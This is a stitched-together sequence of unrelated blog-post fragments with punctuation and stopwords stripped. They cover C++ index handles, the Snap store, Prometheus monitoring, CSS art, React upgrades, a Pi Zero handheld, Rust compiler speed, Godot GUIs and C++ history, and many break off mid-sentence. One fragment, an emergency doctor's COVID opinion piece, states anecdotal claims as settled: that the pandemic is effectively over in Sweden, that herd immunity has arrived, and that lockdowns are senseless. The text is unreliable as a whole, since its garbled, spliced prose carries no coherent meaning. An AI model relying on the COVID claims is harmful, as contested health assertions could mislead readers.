replaces raw smartpointers indexhandles last blog post mentioning pointer allocationfree programming skipping detail following blog post based sometimes painful experience wrestling year fairly big c code base around mloc memory often managed smart pointer worst case ten hundredsofthousands small c object heap allocation pointing smart pointer code quite robust term memory corruption segfaults corruption rarely happens since attempt caught asserts dereferencing smart pointer type object spiderweb code also dogslow without obvious starting point optimization since entire code full cache miss typical problem memory fragmentation fake memory leak forgotten smart pointer prevents freeing underlying memory call fake leak type leak caught memory debugging tool nothing presented particularly new clever collection simple idea together work fairly well bigger code base prevent least detect early number common memoryrelated problem c c may even useful higherlevel garbagecollected language reduce pressure garbage collector however underlying design philosophy fit well classical oop world application built small autonomous object interacting also quite tricky implement idea big existing oop code base object creation destruction happens decentralized code approach described work well though dataoriented architecture central system work array data item packed tightly memory following blog post written game developer perspective also apply area program need juggle hundred million object generally data item memory item created destroyed frequently gist move memory management centralized system like rendering physic animation system sole owner memory allocation group item type array treat array base pointer systemprivate creating item return indexhandle outside world pointer item indexhandles use many bit needed array index use remaining bit additional memory safety check convert handle pointer absolutely needed store pointer anywhere explain point detail idea basically common userlevel code directly call memory allocation function like malloc new makesharedmakeunique reduces use pointer absolute minimum shortlived reference direct memory access item absolutely needed importantly pointer never owner item underlying memory instead direct memory manipulation happens much possible inside centralized system memoryrelated problem easier debug optimize move memory management central system blog post system usually fairly big part code base take care number related task like rendering physic ai character animation system separated system usercode clearly defined function api work happens system data performed tight central loop instead spread code base system often work item created destroyed control user code note creation destruction item

layout additional knowledge item used one obvious optimization reduce number general memory allocation grouping item type array allocate array system startup instead performing memory allocation time new item created system keep track free array slot pick next free slot user code longer need item system simply mark slot free instead performing deallocation different typical pool allocator pool allocation likely little bit faster performing memory allocation per item even main reason keeping item array modern general allocator quite fast small allocation additional advantage item guaranteed packed tightly memory general allocator sometimes need keep housekeeping data next actual item memory easier keep hot item continuous memory range cpu make better use data cache also possible split data single item several subitems different array even tighter packing better data cache usage aos v soa everything inbetween data layout detail remain private system trivial change without affecting outside code long system need reallocate array guaranteed memory fragmentation although le issue address space easier detect memory leak early provide useful error message new item created system trivially check current number item expected upper bound instance game might know never texture alive time since texture created rendering system system print useful warning message number exceeded public indexhandles instead pointer keeping system item array instead unique allocation advantage item identified array index instead requiring full pointer useful memory safety instead handing memory pointer outside world system treat array base pointer private knowledge hand array index public without base pointer compute item memory location outside code access item memory even lot criminal energy number advantage many situation code outside system never even need directly access memory item system ideal situation user code never access memory pointer never cause memory corruption since system know array base pointer free move reallocate item array without invalidating existing index handle array index need fewer bit full pointer smaller data type picked turn allows tighter packing data structure better data cache usage caveat additional handle bit used increase memory safety user code need access memory item directly need obtain pointer lookup function take handle input return

point item even valid memory pointer used simple code block across function call every time handle converted pointer system guarantee returned pointer still point item handle originally created guarantee decay time since item pointer may destroyed underlying memory may reallocated different location problem iterator invalidation c two simple rule easy memorize good compromise exposing

interestingly flatpak multiple repository flathub main one fedora elementary o also host store contrast one snap store note introduction flatpak snap please read future linux desktop application delivery flatpak snap snap designed device connects single store three reason user easily discover new application developer easily publish apps developing snap easier canonical company behind snap ubuntu already tried distributed approach discovered downside snap personal package archive ppas recommended way get thirdparty software ubuntu user idea developer creates tiny repository includes app user get new software adding ppa installing software using package manager similar flatpak support multiple store android io user often find new software opening app store searching need possible ppas software ppa show ubuntu app store user add snap solves single repository available apps user discover new software straight app store instead search internet many developer also find creating maintaining repository cumbersome canonical tried make easy possible ppas launchpad taking care building hosting apps nevertheless process inherently complicated uploading app store although ppas still used many developer even software available download website issue unknown flatpak project flathub created single store contains apps benefit everyone given downside distributed approach canonical decided invest engineering resource part snap instead creating distributed system multiplier complexity feature becomes harder implement said snap developer made clear past anyone interested implementing feature snap definitely ever alternative snap store let hope although snap designed device connects single store multiple store still exist distribution like manjaro could well point snap

open sourcing snap store backend would require significant change according martin wimpress canonical history snap store integrates area canonical infrastructure snap store single thing like one piece software easily decouple rest machinery power infrastructure canonical pull apart separate say go open source snap store canonical doubtful investment would worth happened launchpad although invested significant resource open sourcing launchpad still one instance launchpad running received significant contribution noncanonical employee interestingly canonical actually released opensource prototype snap store backend year ago little interest community actually maintaining running second snap store project bitrotted became incompatible current snap protocol distros curate package linux mint recently made headline blocking user installing snap linux mint one reason gave decision centralization snap mean linux mint provide different version certain snap user explain possible apt thanks way apt work bug fixed upstream debian fix patch debian ubuntu ubuntu linux mint linux mint anyone fix distribute ppa understandable distribution want level control package user get already possible snap store brand store special copy snap store admins select package main store available additional modified package included european space agency example brand store specific satcom research downside brand store still using infrastructure canonical linux mint stranger like ubuntu derivative heavily relied canonical infrastructure first started even using regular ubuntu repository mirror another option would create snap store similar functionality canonical previous behavior suggests would open helping effort thought single snap store closed source part controversial part linux community decision single store per device seems reasonable clear advantage user developer still happy flatpak exists competing project decentralized design elementary o hybrid approach great job taking advantage hope someday community creates alternative snap store similar fdroid like fact snap store backend proprietary becoming core part ubuntu think anything wrong canonical producing closedsource addons top ubuntu open core fashion gitlab really well amazing open source github alternative nothing wrong canonical trying make money ubuntu would without linux great company surrounding take issue currently use snap intended purpose without proprietary backend ironically ubuntu former community member jono bacon made clear recent video proprietary part open core project need optional paid enterprise feature snap store proxy fine example snap still completely functional without said pragmatic proprietary backend dockerhub github insanely popular completely proprietary moreover canonical much receptive community pressure docker inc github much better position steer towards right thing snap offer lot advantage compared apt compared flatpak thing really work canonical always build

interrupted syscall something like writing file yep write get poked head kernel return early work done notice restart might notice write return ssizet hopefully people reading know value might return commonly get back number byte asked write good bit le common mean something broke grovel around errno see actually happen fewer people realize middle ground everything nothing let say call write tell

improved performance reliability system also brought new challenge difficulty particularly term monitoring given origin custom tool designed distributed setting mind lacked ability easily aggregate

discussion although power prometheus conceptually straightforward powerful boast strong visualization support via grafana built dynamic distributed system generalizes wing flightaware equally strong support whitebox blackbox monitoring excels systemslevel observation still might clear benefit prometheus provides current hyperfeed monitoring system militate doubt type look two specific case prometheus supersedes current praxis contributes general excitement enthusiasm adopting monitoring one core piece flightaware infrastructure first case involves inhouse library currently commission used several year hyperfeed whitebox monitoring inhouse library provided event counter api took name event interest behindthescenes would increment integer integer counter stored postgres database used hyperfeed shared state database view aggregated counter day tool lot commend count event time seemingly simple immensely powerful also suffered host problem led retirement ended negatively impacting performance data model made aggregation ratecalculation difficult lacked suitable visualization exploring data obsoleted tool intention resurrecting newer improved form prometheus solving aforementioned problem plus allows even limited use case inhouse tool developed tracking count particular event time prometheus provides counter data type counter increase reset value counter given time interesting important value change time really matter might seem like would uncomplicated implement various subtlety work related missing data counter reset prometheus mercifully take care u whereas inhouse tool stored counter postgres eventually caused unacceptable performance problem prometheus counter kept memory process incrementing collected stored prometheus server tidily solves issue addition inhouse tool capture dimensionality data well prometheus use label feature built design using grafana counter rate change easily powerfully visualized thereby solving issue inhouse tool bringing back new vastly improved form visualization modernization second case prometheus grafana enable major improvement system monitoring hyperfeed involves measuring visualizing rate hyperfeed input order provide global picture flight tracking flightaware combine data several dozen different source key part monitoring hyperfeed monitoring input measuring total rate decomposing rate subset data source prometheus grafana done zabbix zabbix could collect data hyperfeed data without issue struggled immensely visualization given sheer number data feed consequently readily support data exploration prometheus grafana however handle task exceedingly well easily one thing zabbix metric collected form inputdata feed name make querying either aggregate input rate subset input rate quite clumsy prometheus data model hand concisely encodes label input feed data feed name aggregating input feed easily expressed prometheus query language sum rate input feed querying subset feed simply expressed regular expression label value grafana tightly integrated prometheus make simple generate graph combination input data source news tool completely effortlessly give u monitoring capability lacking current approach two specific example benefit prometheus grafana general relative current monitoring stack encourage u adopting tool top aforesaid monitoring upgrade prometheus grafana also provide number additional plus one start using prometheus incrementally completely get rid current monitoring tool move production immense benefit since already lot alerting place zabbix need carefully transition away measured piecemeal fashion time development prometheus tcl library mean becomes available crew wing use example guidance grafana already use crew buyin across company potent visualization tool help make dashboard accessible understandable across flightaware added benefit ease visualization firstclass support prometheus grafana encourages data exploration way simply feasible current tooling lastly since prometheus built distributed dynamic system aim operationally simple conceptually intuitive majority use case make possible relatively small team spend time

would able discover something new fairly happy rest night today like share everyone thing learned along journey warned think practical frontend developer mostly active twitter codepen also put small project github link find online even though frontend developer usually enjoy browsing designrelated artistic creation like focus detail lot learned process observation creation express concept idea brush stroke reflects unique characteristic tool created traditional chinese painting bamboo common theme traditional chinese painting bamboo leaf extremely challeging get right numerous way paint based angle observe different shape typically bamboo leaf drawn single stroke brush applying varying amount pressure different point leaf obain bladeshape take lot skill grasp nuance required control amazing part chinese brush painting hinge shape softness brush painting bamboo leaf another stiffer implement would give effect another interesting type art come across sand painting sand painting relies texture sand interplay light shadow easy task draw straight line sand different form expression numerous technique cs stemmed dealing issue crossbrowser support attempt achieve certain complex design even though pain deal issue pretty exciting manage find solution cs may le flexible canvas svg may also le perfomant time cs meant drawing however many people use cs create art included purely fun order use cs create art neccessary understand limit cs capable importantly must accept limit weakness let first take look line basic element drawing numerous way draw line using cs actually concept line cs merely creating illusion line element property set height width element give background colour make look like line another way use single side border property could also make use lineargradient property one thing want mention possibility using textdecoration pseudoelement need textual content underscore control length line thickness controlled font size advantage technique easily draw dashed line setting textdecorationstyle dashed speaking dashed line interesting technique consider textemphasis free determine character use example dot dash use letterspacing control gap size using lineargradient also option make use backgroundrepeat property really straightforward use border dashed property builtin versatile technique covered line rounded corner done borderradius issue chrome render well small pixel size something take note mind trouble could also use multiple gradient achieve effect moving another basic element circle web box true concept circle cs drawing circle requires element equal width height plus borderradius setting different value corner make bloblike shape circle also drawn radialgradient limitation edge circle smooth could also use dot adjust size using fontsize property think clippath best bet builtin circle function though use clippath able use boxshadow border clippath make easy draw semicircle ellipsis like cs use myriad technique achieve effect triangle earliest cssonly triangle drawn element height width manipulating border value achieve different triangular shape reckon people came technique really smart first came across blog post yahoo quite early rightangled triangle created fairly simply manipulating lineargradient property clippath straightforward implementation triangle point plane need plot point create triangle choice unicode also provides large number shape utilise via pseudoelements cs polygon thing quite simple mostly would require use clippath let take deeper look going think typical cartesian plane made infinite number discrete x coordinate pair polygon function clippath making use create different shape make use trigonometric function help u figure thing point need utilise javascript think totally fine using javascript help u generate requisite value dynamically much better approach manual calculation point considering regular polygon use case making use point divide circumference part utilise trigonometric function sine cosine calculate requisite coordinate plug back function look point point point point shape generated clippath number point get sufficiently large polygon essentially becomes circle also utilise mathematical function draw different type curve lissajous curve investigated century relatively wellknown made system parametric equation discovered curve work really well clippath polygon function take optional fillrule parameter default value nonzero change value evenodd applied starshape clip intersecting section like make use behaviour generate kind different shape first realised possible intruigued result shape resemble undersea creature even creature outer space small sampling possible trigonometric function another technique use setting boxshadow property inset together borderradius crescentshaped moon use element varying height width well different borderradius value boxshadows end shape resemble brush stroke possible combine multiple brush stroke shape achieve desired effect covered numerous technique creating different shape cs use shape simplest method render tile surface also use cs grid lay shape grid layout system trying achieve combine related shape form new one cs inherently tied dom need match number element size grid want example wanted grid would need element lay cs grid starting simple rule straight line rotated deg clockwise anticlockwise direction rule randomly select one line put grid even though simple rule adjacent line could potentially joined end maze effect pattern around long time using cs rotate line well another rule quarter circle randomly choose one quartercircles place grid adjacent shape combined able get variety interesting pattern using borderradius draw quartercircles also use clippath radialgradient draw shape well next question dynamically generate pattern cs posse logic necessary something like could utilise concept dice result use particular set value result show different set value also make use javascript think inevitable javascript involved would like talk bit cssdoodle tool wrote year ago solve problem order make use random function useful thing generate pattern use cssdoodle generate draw shape dynamically modify value create pattern different scale grid cs dependent html tool allows focus cs rule pattern complicated code generates cs rand function range change value range update accordingly pick randomly pick value matrix inspired logo programming language sure played past pick function well let take look another grid one interesting grid property gridautoflow one speaker mentioned earlier grid item different height width property arrange grid item fill empty space possible hence get effect like point add element grid adding pseudoelement every grid item spruce pseudoelements different background colour give range size oh forgot mention something earlier let go back slide stuff within cs grid sure experience glsl opengl shading language shaders general might familiar style mapped onto grid cell like shaders mapped every pixel similar concept performance probably good back let say pseudoelement like one would apply style every grid item get effect like one see pattern right amount complicated effect quite pretty making use property cs grid let take look property grid basic technique generate pattern could randomly put stuff grid discover sort unique pattern pretty convenient technique first borderstyle lot value borderstyle commonly used border style used decorative purpose example rotating transforms basically done rotate scale pattern previous slide think thick modify borderwidth change bordercolor red purple kind ugly right colour bright modify opacity value randomly also randomly modify value grid function also use gap property give pattern bit breathing room still improvement made design line aligned neatly let give bit variety transforms row pas value existing row every grid cell something like get skewed effect result gap line use sin function increase value even thing give u better result effect seeing result random value bordertop borderleft pattern kind resembles window pattern found ancient home let use dotted value keyboard mine issue repeat keystroke sometimes pattern us borderstyle dotted increase size value actually putting dot circular path even though using divs seems like generating lot circle let look borderimage find property le used started playing around last year course managed dive really deep yet found interesting generates symmetric pattern code pattern previous slide let change value increase rotation make effect much thicker change value around really end rather nice result could also make use possible value borderimage combined number different value see symmetry resultant pattern gradient really like gradient cs cs allows u pseudoelements way generate gradient limit many use use generate element design rather straightforward design single div generate line using lineargradient maybe circle radialgradient even though div generate unlimited gradient make shortcoming draw many different shape gradient apply single div end interesting result another pattern like make use mixblendmode using gradient per div divs make gradient originally look merely zoomed pattern end result code scifi feel exactly sure consituent part design playing around different value various function seems generate pleasant result single gradient let add gradient mix apply backgroundblendmode property pretty useful using multiple gradient gradient blend together quite tricky control colour increase number gradient end result colour really hard control experiment current design red change value colour different also change angle lineargradient give range colour hard deal since colour problem make use huerotate filter make tweak colour nice without filter red blue colour filter look slightly better effect done multiple conic gradient make change function value end completely different effect personally like look lot effect achieve gradient pattern made combination line dot generated via lineargradient radialgradient respectively could also achieve something like line made multiple linear gradient shape created clippath box shadow one favourite property box shadow gradient similar limit number shape generate people make use boxshadow create pixel art relatively small creation think look rather pretty lot code involved culmination numerous box shadow try add also modify value boxshadow property adjust position shape another effect quite fond done using boxshadow filter much code involved creating box shadow element applying filter effect get rid filter look like change value contrast effect start morph change accordingly using value seems create pleasant end result pattern look like would see microscope textshadow operates similar fashion would use property text making use text also option using unicode symbol happens use character x apply different colour size textshadow sort combine together like effect made entirely dot spread distribution dot different combined end design feathery effect made parenthesis applause thank everyone also experiment symbol satisfied shape parenthesis modify transforms originally look like apply rotation skew end shape made particular design applause sort look like aquatic plant suppose made previously created skewed parenthesis dot also textdecoration resemble border property dot dash also something called wavy finally something curvy work let see make use need set value wavy adjust length line changing value content actually hiding actual text content straight line displaying wavy text decoration rotate multiple wavy line equal interval like also add perspective value see anything different yet apply rotation transformation end something like different value perspective give u different end result textual content try unicode character like x character added effect throw colour get something like also animate entire thing applause animation involves animating perspective value filter latest thing experimenting use svg filter quite lot work extremely well cs even though may think cs think matter create lot thing filter use often fairly common involves adding noise texture conic gradient add filter gradient transforms parameter value really fascinating need tweak little bit get spectacular effect play around well also randomise seed value end different effect every time effect achieved adding radial gradient previous mix look rather pretty tweaking parameter value filter get something like worked back never seen effect think look quite nice look like terrain alien planet svg filter used create cloud complicated involves addition boxshadow see look like without filter filter applied get cloud also done boxshadow svg filter specifically inset box shadow appears expand inward instead like mention animation well want animate upwards hundred thousand element going quite janky handful fine thousand element perform well demo made back even though look like lot dot maybe thousand actuality divs involved trick apply gradient divs since gradient unlimited say apply gradient div divs work dot animation performs quite well animation cpu fan start spinning really good sign let look different example even though seems like many line actually divs div look like increasing number divs give u effect div line made linear gradient also discovered svg filter work well animation apply filter previous animation end wavestyle animation tweaking basefrequency give u many different effect well really parameter quite fascinating another svg filter found cs gaussian blur cs blur filter directionless svg determine filter horizontal vertical changing standard deviation value make interesting effect well also want talk cs fractal design nowadays use rem value use em value seem le common find em value interesting nested element fontsize every element calculated based fontsize parent element tree nested recursion good characteristic make use cs used manipulate dom tree structure easily target individual node cs selector markup resembles tree structure syntax cs selector allows u formulate dsl domain specific language styling simple tree structure element child nested within cs make relatively simple apply recursive styling without write lot code also added new functionality cssdoodle let add apologise experimental feature browser alright type recursive structure added additional styling every element case applied boxshadow dot made radialgradient end result pretty good performance nt great experiment last thing want touch houdini present u numerous possibility future thing already mentioned previously skip unique thing customdefined property could put value even javascript course could go one step creating little language lsystem written logic within custom property could also recreate logo programming language style syntax within custom property value logic behind style houdini around quite time hope everyone interested explore possible make interesting creation lot experimentation may come realisation lot cs technique translated domain conversely technique outside cs applied cs well would like encourage everyone broaden horizon experiment type tool technique like processing example feel akin music different musical instrument produce sound varying musicality well different style playing really need understand nature music use express important lesson learn really could go deeper topic mentioned nt enough time wrapping hope talk inspired way thank much would like thank yuan chuan reviewing translation giving inspiring talk professional translator best effort may insufficient

speedup got far away theoretical limit basewidth able get speedup image width well unfortunately large number barrier achieving good speedup practice ineffective cache utilization memory bandwidth

improve locality seam carving high span performing small amount work synchronization example rowmajor strategy use barrier row triangular strategy use two barrier per strip cause scheduler perform

react option great wanted provide another option react enables gradual react upgrade upgrade react soon react would usually upgrade whole app work well many apps get increasingly challenging codebase written year ago actively maintained possible use two version react page react fragile caused problem event fixing many problem react mean react next future version come option first option upgrade whole app like might done also option upgrade app piece piece example might decide migrate app react keep lazyloaded dialog subroute react mean gradual upgrade apps upgrading still best solution loading two version react even one loaded lazily demand still ideal however larger apps actively maintained option may make sense consider react enables apps get left behind enable gradual update

gradual upgrade prepared example repository demonstrating lazyload older version react necessary demo us create react app possible follow similar approach tool welcome demo using tooling pull request note postponed change react goal release enable gradual upgrade upgrading react difficult would defeat purpose change event delegation technically always possible nest apps developed different version react however rather fragile react event system worked react component usually write event handler inline button onclick handleclick vanilla dom equivalent code something like mybuttonaddeventlistener click handleclick however event react actually attach dom node declare instead react attache one handler per event type directly document node called event delegation addition performance benefit large application tree also make easier add new feature like replaying event react event delegation automatically since first release dom event fire document react figure component call react event

construct value type foo exactly happens talked constructor constructor nothing function manufacture value value pretty much defines every function constructor nt helpful go bit constructor primitive function make value type build function make value type also constructor function define write data declaration constructor something dismantles data data seems constructed aggregating value thing deconstructs data called eliminator universal eliminator haskell case statement case myfoo b case statement accepts parameter put case return value type branch case statement must type write case statement writing function like mycase foo x nicer syntax mean eliminator always shape case statement reality eliminator function haskell provides special syntax function written better way go lisp

destructure conslist two eliminator car cdr car take list return head cdr take list return tail haskell also offer eliminator everyone frown use much declare record datatype haskell helpfully creates

rushworth md view post sebastian rushworth md,ok want preface article stating entirely anecdotal based experience working doctor emergency room one big hospital stockholm sweden living citizen sweden many people know sweden perhaps country taken relaxed attitude towards covid pandemic unlike country sweden never went complete lockdown nonessential business remained open people continued go cafés restaurant child remained school people bothered face mask public covid hit stockholm like storm midmarch one day seeing people appendicitis kidney stone usual thing see emergency room next day patient gone thing coming hospital covid practically everyone tested covid regardless presenting symtom people came nose bleed covid came stomach pain covid month covid patient disappeared four month since start pandemic seen single covid patient month test someone cough fever test invariably come back negative peak three month back hundred people dying day covid sweden country population ten million around five people dying per day whole country number continues drop since people generally die around three week infection mean virtually noone getting infected assume around percent infected die think generous later mean three week back people getting infected per day whole country work daily risk per person getting infected miniscule remember risk dying actually get infected three week ago basically covid practical sens done sweden four month total covid killed people country ten million country annual death rate around people considering died covid year old quite would died year anyway make covid mere blip term effect mortality nonsensical compare covid major pandemic like pandemic killed ten million people covid never even come close number yet many country shut entire economy stopped child going school made large portion population unemployed order deal disease medium proclaiming small percentage population antibody therefore impossible herd immunity developed well herd immunity developed sick people rate infection dropped precipitously considering people sweden leading life normally socially distancing wearing mask still high rate infection reason test antibody easy cheap antibody fact body main defence virus infection tcells tcells harder measure antibody really clinically quite possible tcells specific covid thereby make immune disease without antibody personally think happened everybody work emergency room work antibody test actually antibody spite exposed huge number infected people including beginning pandemic realized widespread covid noone wearing protective equipment denying covid awful people get really sick family people die awful family people die cancer influenza opioid overdose size response world including sweden totally disproportionate size threat sweden ripped metaphorical bandaid quickly got epidemic done short amount time rest world chosen try peel bandaid slowly present mean sweden one highest total death rate world covid sweden people gone back normal life barely anyone getting infected willing bet country shut completely see rate spike open case point shutting first place country going end number dead end day anyway shutting completely order decrease total number death make sense willing stay shut vaccine available could take year country willing wait long covid present killed le sweden unlikely number dead go average influenza year sweden people die influenza mean covid ten time worse influenza influenza around century covid completely new average influenza year people already level immunity infected similar strain previously vaccinated quite possible fact likely case fatality rate covid influenza slightly higher entire difference seen due complete lack immunity population start pandemic conclusion make sense swedish fatality number reached point hardly active infection going sweden spite fact barely social distancing happening mean least population infected already developed immunity five million people number perfectly reasonable assume reproductive number virus two person infects two new five day period infected infecting others start one infected person country reach point

language variable type supported type system implicit type conversion note mathematical operator defined type multiplying integer floating point number result floating point number example crush sometext crush sometext somenumber error process argument specified type named unnamed argument crush support named unnamed argument often possible use one combination following three invocation equivalent http uri http examplecom method get http http examplecom get http http examplecom method get quite common want pas boolean argument command crush special shorthand syntax passing foo equivalent passing footrue subshells sometimes want use output one command argument another command like subshell eg bash different using output input done using crush echo pwd closure crush brace used create closure assigning closure variable create function crush printgreeting echo hello crush printgreeting hello named argument passed calling closure added local scope invocation crush printa echo crush printa greeting greeting added type safety declare parameter closure expects start closure following closure requires caller supply argument allows caller specify argument b must type integer caller specify fall back default value crush printthings b integer additionally operator used create list unnamed argument operator used create list named argument mentioned elsewhere parameter list crush printeverything unnamed named echo named named unnamed unnamed operator also used command invocation perform mirrored operation following code creates l function call l command

peek new clear content current working directory life namespace file current working directory part local namespace mean eg file object point current working directory operator used crush join two file directory element together mean part using file crush extremely simple convenient crush cd think crush cd right hand side operator label value foo refers file named foo current working directory unrelated content variable named foo namespaces member method member accessed using operator language tend use common character file name crush needed find something else type several useful method file exists stat expect crush exists true crush stat isdirectory true isfile false issymlink false inode nlink mode len crush stat isfile false semilazy stream evaluation assign output find command

one pi zero computer version departs little previous one focused modularity forgoes keyboard standard though possible add one show bit goal create something versatile allowing sort use case unlock zero potential anyways let take look browser support video tag youtube mirror design first thing notice device look little like fat smartphone entire thing basically designed around waveshare amoled touchscreen http thing originally designed raspberry pi created bunch custom adaptor let hook pi zero instead minute around outside see various port button including full size usb port micro sd socket operating system micro usb charging power switch side headphone jack programmable button hooked zero gpio pin could set sort function like rotating screen volume launching custom script application single press top end another button turn display helping stretch lipo battery life also grill hiding little speaker behind back device potential lie includes socket connect gpio pin video camera connector usb port power indicator idea allow people create add custom backpack change functionality depending need internals order connect zero display smallest possible space created main pcb smaller adaptor pcbs zero screwed onto board soldered directly via gpio pin main board contains usb hub power circuit audio amp speaker button headphone jack even vibration motor custom notification micro sd card board plugged zero extends card socket also double frame port bottom device waveshare display already mounting screw securing main board easy little header section connect display main board simply screw everything together included threaded insert onto board make attaching different case simple zero usb port standard designed little usb hub circuit main board using simple chip split usb port separate stream good enough lower consumption stuff like mouse keyboard well display touchscreen capability probably need hook external line power hungry peripheral particularly pleased hdmi adaptor connects full size hdmi port display mini hdmi port zero wracking brain long time connect smallest possible way turn using two thin pcbs sandwiched together allows since solder hdmia plug component take pcb smaller mini hdmi plug take board power section something trouble based powerboost design supposed fit directly onto main board couple small ic fiddly hand solder damaged making video would included powerboost board unfortunately enough room instead used cheap generic charge boost board fine prototype nt extra feature low battery indicator better power switch circuit next iteration zero nt come audio standard thankfully waveshare display built headphone jack audio hdmi wondered added audio amp circuit pin headphone jack whether could power small speaker yes work unfortunately well though good enough stuff like bleep bloops notification sound audio headphone sound great though added jack accessible outside case particular jack mechanical switch default speaker automatically switch headphone whenever plug inserted addons previously mentioned think backpack feature really see potential device imagine sort different backpack could transform functionality thing like radio transceivers extra network interface game controller tv tuner solar panel simple stand easily doable cool thing since modular swap fly change functionality say could change keyboard radio transceiver combo packet radio messenger replace different operating system micro sd card add game controller turn portable emulator first prototype backpack created slideout keyboard combine window manager quite productive handheld linux machine even though zero nt powerful computer still get lot done terminal since us fraction resource gui design based great mini pi qwerty keyboard bobricius hackaday us chip turn usb input device made using pcb layer firstly bottom contains electronic component key cover pcb display key label another board connects terminal slide mechanism made printed support tiny screw slide need extra work make robust bottom layer connects top using little spring loaded pin also added couple led toggle low light final thing surprisingly thin millimetre deep although think look good nt gotten working properly yet talked bob design think solid problem appears chip programmer using get firmware onto one cheap one seems giving false verification message anyways get idea could make zero terminal pretty handy little device also created another custom mini keyboard stand time using salvaged psion keyboard still probably one best small keyboard ever designed used premade psion keyboard usb adaptor find tindie thing open source make would nt much stretch go even develop full adaptor case would turn palmtop computer working hinge maybe bigger secondary battery usb hub next step registered zeroterminalorg currently redirecting page next year update design want make website help build platform showing people exactly make showcasing backpack custom apps user create meantime want redo main pcb change component like rubbish speaker redesign power circuit etc maybe even experiment using raspberry pi compute module instead long term amazing design custom display board entire device could shrunken closer smartphone size anyways hope found interesting know lot learn kind stuff advice expert welcome please share video around think others

perfrustlangorg readme cargollvmlines inlining code bloat cargollvmlines speed compilation largest crate servo miscellaneous speed change since april table graph benchmark description lewton faster past three year,last wrote april work speeding rust compiler time another update weekly performance triage first process change started weekly performance triage tuesday looking performance result pr merged past week pr regressed improved performance nonnegligible amount add comment pr link measurement also gather result weekly report mentioned week rust also looked weekly compiler team meeting goal ensure regression caught quickly appropriate action taken raise awareness performance issue general take minute time instruction written way anyone though take bit practice newcomer become comfortable process started sharing task around mark rousskov recent triage process change inspired regression prevented section excellent blost post nikita popov aka nikic work improve speed llvm process also take idea firefox nightly crash triage set year ago leading project uptime speed llvm directly impact speed rustc rustc us llvm backend big deal practice upgrade llvm caused significant performance regression rustc though enough performance improvement landed around time relevant rustc release still faster overall however thanks nikic work upgrade llvm win back much performance lost upgrade llvm seems llvm performance perhaps received much attention past pleased see new focus methodical performance work take lot time effort effectively done single person longterm strongly encourage working llvm make team effort anyone relevant skill andor interest get involved better benchmarking profiling also major improvement rustcperf performance suite harness drive perfrustlangorg also used local benchmarking profiling commandline interface local benchmarking profiling command ugly confusing much one person mentioned zulip tried failed use really want people local benchmarking

access win pr changed sparsebitset use arrayvec instead smallvec storage possible maximum length known advance win pr eliminated two field struct used printing error message case internal compiler error win speed change since april since last blog post change compile time mixed table graph disappointing see sea green table result like last time many regression seem alarming bad first seems understanding requires knowing bit detail benchmark suite benchmark saw large percentage regression extremely shortrunning benchmark description help make clearer example nonincremental check build helloworld went two major cause practice tiny additional overhead millisecond per crate going noticeable many crate take second ten second compile among realworld benchmark saw mixed result eg regex ripgrep saw clear improvement large eg claprs styleservo webrender webrenderwrench mind since last post compiler probably either slower somewhat faster realworld case another interesting data point speed rustc longterm came hacker news compilation one project lewton got faster past three year llvm landed yet give big improvement realworld case soon hopefully next post result uniformly positive

many common problem constructing uiyou center gui building around scene tree shown belowadd duplicate rename gui component keyboardyou move tree keyboard eg use arrow key move container panel wish add

open immediately search bar start typing button see button like node exist typing list get filteredwhile happening time move list arrow key make selection miss focus search bar even thatso select node want hit enter get added child node selected earlierthis way use keyboard entirely arrow key cmda enter build gui hit enter component change name hit cmdd duplicate hence nt need open search say label multiple time know need label make one label duplicate timessane ui component selectionbut efficiency work system stop thereone frustrating thing various ui design tool selecting ui component made multiple component eg qt creator would frequently try select layout containing child component accidentally select child component pull layoutin godot accidentally selecting child component problem notice little icon circled pink next margincontainer icon got toggled earlier clicked icon toolbar circled yellow make child selected canvas still select tree click component laid get parent insteadblocking child node getting selected accidentthis really practical make easy deal layout editor selecting layout tricky another important detail godot favor change parent relationship canvas node tree hence accidentally pull component hierarchy would case change relative position child component parentsuperior customization ui componentsin advanced gui need lot special customized gui

really big problem see however really complex personal experience learning modern cs javascript framework take considerable amount time attempt giving overview different web technology relate may give sense thisit made web page application trying make gui application found often hit limitation imposed assumption scrollable webpageit made reusable component like real gui toolkitsthe latter need explanation web way creating reusable component kind templating basically copy pasting chunk html several time representing new custom componentthis mean typically working templating engine one one mapping writing going web browserthis contrast godot eg development standpoint create custom component instantiate live modification app running thing one got node live application coding help whole round trip lower mental complexity working itnow may seem crazy use game engine making application given steal cpu cycle due need constant rendering however many way pale comparison resource hog web

lack good gui designer know gui designer contentious issue everywhere worked opinion question right need gui design format relatively easy work qml quite good regard support coding using graphical

control node name type button parent panelhboxcontainer marginright clear node name type button parent panelhboxcontainer marginleft clear node name type button parent panelhboxcontainer marginleft clear game engine future example storage format scene godot us notice quite good avoiding nesting thus friendly towards text based mergingand people worried difficulty multiple people working gui godot beautiful system splitting complex uis multiple separate file godot gui hierarchy scene every scene separate filewhy game engine future seems crazy use game engine make gui application people may feel instinctively wrong sobut think good reason world may end way money incentive playthe gaming industry huge game today massive complexity rivaling actual application game development face

clever guessing user wanted variable local global basic rule inside loop outside function socalled soft scope user assigned variable already global name assigned nt global name assignment would create

loop local name assignment creates new local variable period end story dead simple rule despite paper simplicity scope rule many people found unintuitive annoying consider following example end

responsibility one responsibility break code stability becomes major major issue hundred billion line c break said later added far syntax concerned early decided avoid reinventing wheel since extending convention alreadyexisting c programming language knew trouble started however already c community could spend time teaching people write loop could provide decent class concept time besides adding object orientation c also remembered earliest design goal c wanted great freedom expression great generality wanted performance comparable handcoded c straight machine wanted basic type safety given time technology knowledge got two three spent next year trying figure get three get little bit sad hear people talk c back lot people looked back dark age looked since bjarne stroustrup add

better today question came delhi another modern musthave language feature like see retrofitted onto another widespread language way brought objectorientation c stroustrup response seemed take long perspective looking back nearly four decade looking really major thing come often class class hierarchy came package objectoriented programming simula merged c looking ever since generic programming seems proud way language evolved year get little bit sad hear people talk c back lot people stroustrup say later looked back dark age looked since growing dying ready questioner penn state asks make c attractive people today bigger community better performance greater flexibility pretty good start massive tool support massive library good solid language also describes happens language tried displace c first simplify language make easier usually throw away even beyond simplified language end one two path fail get people use language succeed language grows ready example java three four

